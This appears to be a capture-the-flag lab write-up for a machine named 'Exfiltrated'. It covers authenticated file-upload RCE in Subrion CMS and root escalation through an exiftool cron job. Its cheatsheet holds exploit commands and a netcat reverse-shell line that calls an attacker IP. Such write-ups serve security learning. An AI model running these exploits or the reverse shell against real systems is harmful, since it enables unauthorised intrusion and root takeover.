# Exfiltrated \[Easy]

## Report

Subrion CMS version 4.21 is vulnerable to authenticated file upload RCE. A script is being run every minute as root via crontab which fetches metadata from .jpg files in the 'uploads' directory. Transfer malicious image file and wait for a minute for reverse shell to spwan as root.

## Cheatsheet

```
https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
sudo python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l 'admin' -p 'admin'
busybox nc 192.168.45.234 8000 -e /bin/sh

cat /etc/crontab
https://github.com/UNICORDev/exploit-CVE-2021-22204.git
python3 exploit-CVE-2021-22204.py -s 192.168.45.234 8001
```

{% code title="image-exif.sh" %}
```bash
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
image-exif.sh
```
{% endcode %}

## Loot

### Enumeration

192.168.178.163

Subrion CMS v4.2.1 vulnerable to authenticated RCE via file upload&#x20;

### Attack Vectors

.phar file extension not included in blacklist of .htaccess file of Subrion CMS, this is leveraged to obtain a webshell

### PrivEsc

exiftool running as root via crontab, google search shows code execution for versions > 7.44

### Creds

admin:admin \[CMS login]

### Proof

{% embed url="https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation" %}
